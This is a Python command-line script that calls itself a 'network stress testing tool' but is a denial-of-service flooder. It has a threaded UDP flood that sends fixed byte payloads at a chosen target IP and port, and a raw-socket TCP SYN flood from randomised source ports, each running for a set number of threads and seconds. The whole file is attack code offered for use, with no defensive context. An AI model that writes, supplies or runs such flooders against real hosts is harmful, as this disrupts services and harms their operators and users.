import socket
import threading
import datetime
import time
import os
import struct
import random
import argparse

zoic = "\033[38;5;118m"
red = "\033[38;5;196m"
clear = "\033[0m"

payloads = [
    b"\x08\xb2\x00\x21",
    b"\x08\xb2\x00",
    b"\xD8\x39\x84\x00",
]

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')             

def udp_attack(host, port, secs):
    end_time = time.time() + secs
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        for data in payloads:
            try:
                s.sendto(data, (host, port))
            except:
                pass
    s.close()

def tcp_attack(host, port, secs):
    end_time = time.time() + secs
    flags = 0b00000010
    while time.time() < end_time:
        try:
            src_port = random.randint(1024, 65535)
            pkt = struct.pack('!HHIIBBHHH', src_port, port, 0, 0, 80, flags, 8192, 0, 0)
            socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP).sendto(pkt, (host, 0))
        except:
            pass

def main():
    parser = argparse.ArgumentParser(description='Network stress testing tool')
    subparsers = parser.add_subparsers(dest='command', help='Attack type')
    
    # UDP 
    udp_parser = subparsers.add_parser('udp', help='UDP flood attack')
    udp_parser.add_argument('ip', help='Target IP address')
    udp_parser.add_argument('port', type=int, help='Target port')
    udp_parser.add_argument('threads', type=int, help='Number of threads')
    udp_parser.add_argument('secs', type=int, help='Duration in seconds')
    
    # TCP
    tcp_parser = subparsers.add_parser('tcp', help='TCP flood attack')
    tcp_parser.add_argument('ip', help='Target IP address')
    tcp_parser.add_argument('port', type=int, help='Target port')
    tcp_parser.add_argument('threads', type=int, help='Number of threads')
    tcp_parser.add_argument('secs', type=int, help='Duration in seconds')
    
    args = parser.parse_args()
    
    banner()
    
    if args.command == 'udp':
        for _ in range(args.threads):
            t = threading.Thread(target=udp_attack, args=(args.ip, args.port, args.secs))
            t.start()
        time.sleep(args.secs)
    
    elif args.command == 'tcp':
        for _ in range(args.threads):
            t = threading.Thread(target=tcp_attack, args=(args.ip, args.port, args.secs))
            t.start()
        
        time.sleep(args.secs)
    
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
